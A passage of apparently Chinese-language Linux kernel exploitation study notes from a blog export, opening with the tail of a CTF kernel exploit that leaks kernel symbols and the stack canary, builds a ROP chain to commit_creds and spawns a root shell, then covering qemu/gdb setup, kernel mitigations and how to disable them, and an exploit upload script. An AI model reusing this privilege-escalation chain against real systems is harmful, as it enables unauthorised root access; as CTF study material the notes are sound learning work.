class="line">            commit_creds = addr;</span><br><span class="line">            off = commit_creds - <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line">            printvar(success, <span class="string">&quot;leak commit_creds&quot;</span>, addr);</span><br><span class="line">            printvar(debug, <span class="string">&quot;offset&quot;</span>, off);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            prepare_kernel_cred = addr;</span><br><span class="line">            off = prepare_kernel_cred - <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line">            printvar(success, <span class="string">&quot;leak prepare_kernel_cred&quot;</span>, addr);</span><br><span class="line">            printvar(debug, <span class="string">&quot;offset&quot;</span>, off);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(kallsyms);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">size_t</span> canary;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leakcanary</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">    ioctl(fd, OFF, <span class="number">64</span>);</span><br><span class="line">    ioctl(fd, READ, buf);</span><br><span class="line">    canary = ((<span class="type">size_t</span>*)buf)[<span class="number">0</span>];</span><br><span class="line">    printvar(success, <span class="string">&quot;leak canaryadd&quot;</span>, canary);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_pop_rdi               off + 0xffffffff81000b2f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_pop_rcx               off + 0xffffffff81021e53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_pop_rdx               off + 0xffffffff810a0f49 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_iretq                 off + 0xffffffff81050ac2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_swapgs                off + 0xffffffff81a012da</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_mov_rdi_rax_rep_movsq off + 0xffffffff814b15953</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_move_rdi_rax_pop_rbp_mov_rax_rdi_pop_r12_ret off + 0xffffffff813f9ede</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">()</span> &#123;</span><br><span class="line">    success(<span class="string">&quot;Backing from the kernelspace.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        fail(<span class="string">&quot;Failed to get the root!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    success(<span class="string">&quot;Successful to get the root. Execve root shell now...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">// to exit the process normally instead of segmentation fault</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwn</span><span class="params">()</span> &#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">    leakAddr();</span><br><span class="line">    leakcanary();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chain = <span class="built_in">calloc</span>(<span class="number">0x800</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *start = chain;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i!=<span class="number">8</span>;i++)&#123;</span><br><span class="line">        chain[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    chain = chain + <span class="number">8</span>;</span><br><span class="line">    *chain++ = canary;</span><br><span class="line">    *chain++ = canary;</span><br><span class="line">    *chain++ = rop_pop_rdi;</span><br><span class="line">    *chain++ = <span class="number">0x0</span>;</span><br><span class="line">    *chain++ = prepare_kernel_cred;</span><br><span class="line">    *chain++ = rop_move_rdi_rax_pop_rbp_mov_rax_rdi_pop_r12_ret;</span><br><span class="line">    *chain++ = <span class="number">0x0</span>;</span><br><span class="line">    *chain++ = <span class="number">0x0</span>;</span><br><span class="line">    *chain++ = commit_creds;</span><br><span class="line">    *chain++ = rop_swapgs;</span><br><span class="line">    *chain++ = <span class="number">0x0</span>;</span><br><span class="line">    *chain++ = rop_iretq;</span><br><span class="line">    *chain++ =  (<span class="type">unsigned</span> <span class="type">long</span>*)getRootShell;</span><br><span class="line">    *chain++ = user_cs;</span><br><span class="line">    *chain++ = user_rflags;</span><br><span class="line">    *chain++ = user_sp;</span><br><span class="line">    *chain++ = user_ss;</span><br><span class="line">    write(fd,start,<span class="number">0x800</span>);</span><br><span class="line">    ioctl(fd, COPY, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));<span class="comment">//利用整数溢出漏洞</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    pwn();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>































]]></content>
      <categories>
        <category>kernelpwn</category>
      </categories>
      <tags>
        <tag>kernelpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>KernelStart</title>
    <url>/2024/08/19/kernelpwn/kernelpwnstart/</url>
    <content><![CDATA[<blockquote>
<p> 参考教程做个总结</p>
<p><a href="https://pawnyable.cafe/linux-kernel/introduction/introduction.html">https://pawnyable.cafe/linux-kernel/introduction/introduction.html</a></p>
</blockquote>
<h1 id="磁盘映像的挂载"><a href="#磁盘映像的挂载" class="headerlink" title="磁盘映像的挂载"></a>磁盘映像的挂载</h1><blockquote>
<p>可以本地修改，如修改初始化相关和符号表相关</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*文件系统*/</span><br><span class="line"><span class="built_in">mkdir</span> root</span><br><span class="line">mount rootfs.img root</span><br><span class="line">/*cpio*/</span><br><span class="line"><span class="built_in">mkdir</span> root</span><br><span class="line"><span class="built_in">cd</span> root</span><br><span class="line">cpio -idv &lt; ../rootfs.cpio</span><br><span class="line">/*归档操作*/</span><br><span class="line">find . -print0 | cpio -o --format=newc --null &gt; ../rootfs_updated.cpio</span><br></pre></td></tr></table></figure>

<h1 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h1><h2 id="初始化相关"><a href="#初始化相关" class="headerlink" title="初始化相关"></a>初始化相关</h2><blockquote>
<p>当内核启动时，它首先运行一个程序。 该程序的路径因配置而异，但在大多数情况下，它位于 <code>/init</code>、<code>/sbin/init</code> 等中。</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">获得加载模块的基址</span><br><span class="line">*/</span><br><span class="line"><span class="built_in">cat</span> /proc/modules</span><br><span class="line"></span><br><span class="line">/*获得符号信息更改</span><br><span class="line">/home/l/kernelpwn/LK01/qemu/root/etc/init.d/S99pawnyable</span><br><span class="line">*/</span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/kptr_restrict     <span class="comment"># 変更前</span></span><br><span class="line"><span class="comment">#echo 2 &gt; /proc/sys/kernel/kptr_restrict    # 変更後</span></span><br><span class="line">/*shell输入*/</span><br><span class="line">grep <span class="string">&quot;commit_creds&quot;</span> /proc/kallsyms</span><br><span class="line">--------------------------------------------------------------------------------------------</span><br><span class="line">/*获得root</span><br><span class="line">更改文件内容</span><br><span class="line">*/</span><br><span class="line">setsid cttyhack setuidgid 0 sh</span><br></pre></td></tr></table></figure>



<h2 id="qemu远程连接选项"><a href="#qemu远程连接选项" class="headerlink" title="qemu远程连接选项"></a>qemu远程连接选项</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">-gdb tcp::<span class="number">12345</span></span><br></pre></td></tr></table></figure>

<h2 id="之后需要掌握调用哪个程序会调用哪个os程序"><a href="#之后需要掌握调用哪个程序会调用哪个os程序" class="headerlink" title="之后需要掌握调用哪个程序会调用哪个os程序"></a>之后需要掌握调用哪个程序会调用哪个os程序</h2>]]></content>
      <categories>
        <category>kernelpwn</category>
      </categories>
      <tags>
        <tag>kernelpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel_proctect &amp; exploit</title>
    <url>/2024/08/19/kernelpwn/kernelpro/</url>
    <content><![CDATA[<p>摘抄自<a href="https://pawnyable.cafe/linux-kernel/introduction/security.html">https://pawnyable.cafe/linux-kernel/introduction/security.html</a></p>
<h1 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h1><h2 id="SMEP（Supervisor-Mode-Execution-Prevention）"><a href="#SMEP（Supervisor-Mode-Execution-Prevention）" class="headerlink" title="SMEP（Supervisor Mode Execution Prevention）"></a>SMEP（Supervisor Mode Execution Prevention）</h2><blockquote>
<p>它禁止在执行内核空间代码时突然执行用户空间代码,硬件安全机制</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/*可查看系统的保护信息，其中的flag字段显示*/</span><br><span class="line">cat /proc/cpuinfo</span><br></pre></td></tr></table></figure>

<h2 id="SMAP（Supervisor-Mode-Access-Prevention）"><a href="#SMAP（Supervisor-Mode-Access-Prevention）" class="headerlink" title="SMAP（Supervisor Mode Access Prevention）"></a>SMAP（Supervisor Mode Access Prevention）</h2><blockquote>
<p>如果启用了 SMAP，则用户空间（ROP 链）中的数据 mmapped 在内核空间中不可见，因此堆栈枢轴的 <code>ret</code> 指令会触发内核崩溃,硬件安全机制</p>
</blockquote>
<h2 id="KASLR-FGKASLR"><a href="#KASLR-FGKASLR" class="headerlink" title="KASLR&#x2F;FGKASLR"></a>KASLR&#x2F;FGKASLR</h2><blockquote>
<p>它可以随机化 Linux 内核和设备驱动程序代码数据区域的地址。一旦内核加载，它就不会移动，因此 KASLR 在启动时只工作一次。</p>
<p><a href="https://lwn.net/Articles/824307/">自 2020 年初以来，</a>出现了一种<strong>名为 FGKASLR</strong>（功能粒度 KASLR）的更强大的 KASLR。 截至 2022 年，它似乎默认处于禁用状态，但这是一种为 Linux 内核中的每个函数随机化地址的技术。 即使 Linux 内核中函数的地址可以泄漏，也不会确定基址。但是，FGKASLR 不会随机化数据段等，因此如果数据的地址可以泄露，则可以获得基址。 但是，无法从基址确定特定函数的地址，但可以将其用于稍后出现的特殊攻击向量。</p>
<p>请注意，地址在内核空间中是通用的。 即使一个设备驱动程序由于 KASLR 而无法被利用，如果另一个驱动程序泄漏了内核地址，它也可能被利用，因为该地址是通用的。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*可以使用内核启动参数禁用 KASLR*/</span></span><br><span class="line">-append <span class="string">&quot;... nokaslr ...&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="KPTI-Kernel-Page-Table-Isolation"><a href="#KPTI-Kernel-Page-Table-Isolation" class="headerlink" title="KPTI(Kernel Page-Table Isolation)"></a>KPTI(Kernel Page-Table Isolation)</h2><blockquote>
<p>2018 年，在 Intel 等 CPU 上发现了一种名为 <a href="https://ja.wikipedia.org/wiki/Meltdown">Meltdown</a> 的侧信道攻击。 虽然没有解释这个漏洞，但它是一个严重的漏洞，允许用户以用户权限读取内核空间中的内存，并且有可能绕过 KASLR。 近年来，Linux 内核启用了一种称为 <strong>KPTI</strong>（内核页表隔离）或 <strong>KAISER</strong> 的旧名称机制，作为对 Meltdown 的对策。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">-append <span class="string">&quot;... pti=on ...&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="KADR-Kernel-Address-Display-Restriction"><a href="#KADR-Kernel-Address-Display-Restriction" class="headerlink" title="KADR (Kernel Address Display Restriction)"></a>KADR (Kernel Address Display Restriction)</h2><blockquote>
<p>在 Linux 内核中，您可以从 <code>/proc/kallsyms</code> 读取函数的名称和地址信息。 此外，一些设备驱动程序使用 <code>printk</code> 函数将各种调试信息输出到日志中，用户可以通过 <code>dmesg</code> 命令查看这些信息。这样，Linux 就有一种机制可以防止内核空间中的函数、数据和堆等地址信息泄露。 我认为没有正式的名称，但它在<a href="https://inaz2.hatenablog.com/entry/2015/03/27/021422">参考资料</a>中似乎被称为 <strong>KADR</strong> （Kernel Address Display Restriction），所以我也将在这个网站上使用这个名称。</p>
<p>此功能可以通过 的值来 <code>/proc/sys/kernel/kptr_restrict</code> 更改。 如果 <code>kptr_restrict</code> 为 0，则对地址的显示没有限制。 如果 <code>kptr_restrict</code> 为 1，则向具有<code>CAP_SYSLOG</code>权限的用户显示地址。 如果 <code>kptr_restrict</code> 为 2，则隐藏内核地址，即使用户处于权限级别也是如此。</p>
</blockquote>
<h1 id="传输exploit"><a href="#传输exploit" class="headerlink" title="传输exploit"></a>传输exploit</h1><h2 id="本地制作与传输"><a href="#本地制作与传输" class="headerlink" title="本地制作与传输"></a>本地制作与传输</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">gcc exploit.c -o exploit -static</span><br><span class="line"><span class="built_in">mv</span> exploit root</span><br><span class="line"><span class="built_in">cd</span> root; find . -print0 | cpio -o --null --format=newc &gt; ../debugfs.cpio</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 loglevel=3 oops=panic panic=-1 nopti nokaslr&quot;</span> \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -cpu qemu64 \</span><br><span class="line">    -gdb tcp::12345 \</span><br><span class="line">    -smp 1 \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd debugfs.cpio \</span><br><span class="line">    -net nic,model=virtio \</span><br><span class="line">    -net user</span><br></pre></td></tr></table></figure>

<h2 id="关于musl-gcc"><a href="#关于musl-gcc" class="headerlink" title="关于musl-gcc"></a>关于musl-gcc</h2><blockquote>
<p>可以减少文件的尺寸</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/kernelpwn/LK01/qemu# gcc exploit.c -o exploit -static</span><br><span class="line">root@L:/home/l/kernelpwn/LK01/qemu# <span class="built_in">ls</span> -al</span><br><span class="line">total 12292</span><br><span class="line">drwxr-xr-x  3 l    docker    4096 Aug 29 13:42 .</span><br><span class="line">drwxr-xr-x  5 l    docker    4096 Aug 29 13:41 ..</span><br><span class="line">-rw-------  1 root root       232 Aug 27 01:04 .gdb_history</span><br><span class="line">-rw-r--r--  1 l    docker 4720640 Oct 27  2021 bzImage</span><br><span class="line">-rw-r--r--  1 root root   2911744 Aug 29 13:19 debugfs.cpio</span><br><span class="line">-rwxr-xr-x  1 root root    900352 Aug 29 13:42 exploit</span><br><span class="line">-rw-r--r--  1 root root        71 Aug 29 13:18 exploit.c</span><br><span class="line">drwxr-xr-x 17 root root      4096 Aug 29 13:19 root</span><br><span class="line">-rw-r--r--  1 l    docker 2011136 Oct 27  2021 rootfs.cpio</span><br><span class="line">-rw-r--r--  1 root root   2011136 Aug 27 00:20 rootfs_updated.cpio</span><br><span class="line">-rwxr-xr-x  1 l    docker     352 Aug 29 00:28 run.sh</span><br><span class="line">-rw-r--r--  1 root root       451 Aug 29 13:19 transfer.sh</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@L:/home/l/kernelpwn/LK01/qemu# musl-gcc ./exploit.c -o exploit -static</span><br><span class="line">root@L:/home/l/kernelpwn/LK01/qemu# <span class="built_in">ls</span> -al</span><br><span class="line">total 11440</span><br><span class="line">drwxr-xr-x  3 l    docker    4096 Aug 29 13:43 .</span><br><span class="line">drwxr-xr-x  5 l    docker    4096 Aug 29 13:41 ..</span><br><span class="line">-rw-------  1 root root       232 Aug 27 01:04 .gdb_history</span><br><span class="line">-rw-r--r--  1 l    docker 4720640 Oct 27  2021 bzImage</span><br><span class="line">-rw-r--r--  1 root root   2911744 Aug 29 13:19 debugfs.cpio</span><br><span class="line">-rwxr-xr-x  1 root root     24728 Aug 29 13:43 exploit</span><br><span class="line">-rw-r--r--  1 root root        71 Aug 29 13:18 exploit.c</span><br><span class="line">drwxr-xr-x 17 root root      4096 Aug 29 13:19 root</span><br><span class="line">-rw-r--r--  1 l    docker 2011136 Oct 27  2021 rootfs.cpio</span><br><span class="line">-rw-r--r--  1 root root   2011136 Aug 27 00:20 rootfs_updated.cpio</span><br><span class="line">-rwxr-xr-x  1 l    docker     352 Aug 29 00:28 run.sh</span><br><span class="line">-rw-r--r--  1 root root       451 Aug 29 13:19 transfer.sh</span><br></pre></td></tr></table></figure>

<h2 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h2><blockquote>
<p>利用base64，和启动脚本进行远程转发,主要用来转发base64编码之后的二进制文件</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ptrlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">cmd</span>):</span><br><span class="line">    sock.sendlineafter(<span class="string">&quot;$ &quot;</span>, cmd)</span><br><span class="line">    sock.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./root/exploit&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    payload = bytes2str(base64.b64encode(f.read()))</span><br><span class="line"></span><br><span class="line"><span class="comment">#sock = Socket(&quot;HOST&quot;, PORT) # remote</span></span><br><span class="line">sock = Process(<span class="string">&quot;./run.sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">run(<span class="string">&#x27;cd /tmp&#x27;</span>)</span><br><span class="line"></span><br><span class="line">logger.info(<span class="string">&quot;Uploading...&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(payload), <span class="number">512</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Uploading... <span class="subst">&#123;i:x&#125;</span> / <span class="subst">&#123;<span class="built_in">len</span>(payload):x&#125;</span>&quot;</span>)</span><br><span class="line">    run(<span class="string">&#x27;echo &quot;&#123;&#125;&quot; &gt;&gt; b64exp&#x27;</span>.<span class="built_in">format</span>(payload[i:i+<span class="number">512</span>]))</span><br><span class="line">run(<span class="string">&#x27;base64 -d b64exp &gt; exploit&#x27;</span>)</span><br><span class="line">run(<span class="string">&#x27;rm b64exp&#x27;</span>)</span><br><span class="line">run(<span class="string">&#x27;chmod +x exploit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sock.interactive()</span><br><span class="line">--------------------------结果----------------</span><br><span class="line">[ptrlib]$ /tmp <span class="comment"># [ptrlib]$ ls</span></span><br><span class="line">ls[ptrlib]$ </span><br><span class="line">[ptrlib]$ exploit      [ptrlib]$ [<span class="number">0</span>;0mmessages     [ptrlib]$ reso[ptrlib]$ lv[ptrlib]$ .c[ptrlib]$ onf[ptrlib]$ </span><br><span class="line">[ptrlib]$ /tmp <span class="comment"># [ptrli./exploit</span></span><br><span class="line">./exp[ptrlib]$ l[ptrlib]$ o[ptrlib]$ it[ptrlib]$ </span><br><span class="line">[ptrlib]$ Hello, World!</span><br><span class="line">不知道为什么格式那么乱</span><br></pre></td></tr></table></figure>



<h1 id="关于内核初始化"><a href="#关于内核初始化" class="headerlink" title="关于内核初始化"></a>关于内核初始化</h1><blockquote>
<p>以LK01为例子</p>
<p>主要是在&#x2F;etc文件中</p>
</blockquote>
<h2 id="inittab"><a href="#inittab" class="headerlink" title="inittab"></a>inittab</h2><blockquote>
<p>涉及到文件系统的挂载</p>
<p>主要是启动时和关闭时的行为</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/inittab</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Copyright (C) 2001 Erik Andersen &lt;andersen@codepoet.org&gt;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Note: BusyBox init doesn&#x27;t support runlevels.  The runlevels field is</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">completely ignored by BusyBox init. If you want runlevels, use</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sysvinit.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Format for each entry: &lt;id&gt;:&lt;runlevels&gt;:&lt;action&gt;:&lt;process&gt;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># id        == tty to run on, or empty for /dev/console</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">runlevels == ignored</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">action    == one of sysinit, respawn, askfirst, <span class="built_in">wait</span>, and once</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">process   == program to run</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Startup the system</span></span><br><span class="line">::sysinit:/bin/mount -t proc proc /proc</span><br><span class="line">::sysinit:/bin/mount -o remount,rw /</span><br><span class="line">::sysinit:/bin/mkdir -p /dev/pts /dev/shm</span><br><span class="line">::sysinit:/bin/mount -a</span><br><span class="line">::sysinit:/sbin/swapon -a</span><br><span class="line">null::sysinit:/bin/ln -sf /proc/self/fd /dev/fd</span><br><span class="line">null::sysinit:/bin/ln -sf /proc/self/fd/0 /dev/stdin</span><br><span class="line">null::sysinit:/bin/ln -sf /proc/self/fd/1 /dev/stdout</span><br><span class="line">null::sysinit:/bin/ln -sf /proc/self/fd/2 /dev/stderr</span><br><span class="line">::sysinit:/bin/hostname -F /etc/hostname</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">now run any rc scripts</span></span><br><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Put a getty on the serial port</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ttyS0::respawn:/sbin/getty -L ttyS0 115200 vt100 <span class="comment"># GENERIC_SERIAL</span></span></span><br><span class="line">tty1::respawn:/sbin/getty -L  tty1 0 vt100 # QEMU graphical window</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Stuff to <span class="keyword">do</span> <span class="keyword">for</span> the 3-finger salute</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">::ctrlaltdel:/sbin/reboot</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Stuff to <span class="keyword">do</span> before rebooting</span></span><br><span class="line">::shutdown:/etc/init.d/rcK</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="etc-init-d-rcS"><a href="#etc-init-d-rcS" class="headerlink" title="&#x2F;etc&#x2F;init.d&#x2F;rcS"></a>&#x2F;etc&#x2F;init.d&#x2F;rcS</h2><blockquote>
<p>目前已知包括了驱动的加载以及shell的加载</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Setup</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line">mdev -s</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">stty -opost</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/kptr_restrict</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Install driver</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line">insmod /root/vuln.ko</span><br><span class="line">mknod -m 666 /dev/holstein c `grep holstein /proc/devices | awk &#x27;&#123;print $1;&#125;&#x27;` 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># User shell</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">echo &quot;[ Holstein v1 (LK01) - Pawnyable ]&quot;</span><br><span class="line">setsid cttyhack setuidgid 0 sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Cleanup</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line">umount /proc</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*本题考查此模块*/</span></span><br><span class="line">insmod /root/vuln.ko</span><br><span class="line">mknod -m <span class="number">666</span> /dev/holstein c `grep holstein /proc/devices | awk <span class="string">&#x27;&#123;print $1;&#125;&#x27;</span>` <span class="number">0</span></span><br></pre></td></tr></table></figure>



<h1 id="驱动模块源码分析"><a href="#驱动模块源码分析" class="headerlink" title="驱动模块源码分析"></a>驱动模块源码分析</h1><h2 id="设备注册和设备清除"><a href="#设备注册和设备清除" class="headerlink" title="设备注册和设备清除"></a>设备注册和设备清除</h2><blockquote>
<p>指定了模块加载以及退出时所要执行的函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">rcS中仅仅创建了一个节点真正关联是通过此来的</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">module_init(module_initialize);</span><br><span class="line">module_exit(module_cleanup);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>本次实验中的函数为:可通过DEVICE_NAME来传递</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;holstein&quot;</span></span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">module_fops</span> =</span></span><br><span class="line">  &#123;</span><br><span class="line">   .owner   = THIS_MODULE,</span><br><span class="line">   .read    = module_read,</span><br><span class="line">   .write   = module_write,</span><br><span class="line">   .open    = module_open,</span><br><span class="line">   .release = module_close,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">dev_t</span> dev_id;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">c_dev</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">module_initialize</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (alloc_chrdev_region(&amp;dev_id, <span class="number">0</span>, <span class="number">1</span>, DEVICE_NAME)) &#123;</span><br><span class="line">    printk(KERN_WARNING <span class="string">&quot;Failed to register device\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EBUSY;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cdev_init(&amp;c_dev, &amp;module_fops);</span><br><span class="line">  c_dev.owner = THIS_MODULE;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cdev_add(&amp;c_dev, dev_id, <span class="number">1</span>)) &#123;</span><br><span class="line">    printk(KERN_WARNING <span class="string">&quot;Failed to add cdev\n&quot;</span>);</span><br><span class="line">    unregister_chrdev_region(dev_id, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> -EBUSY;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span 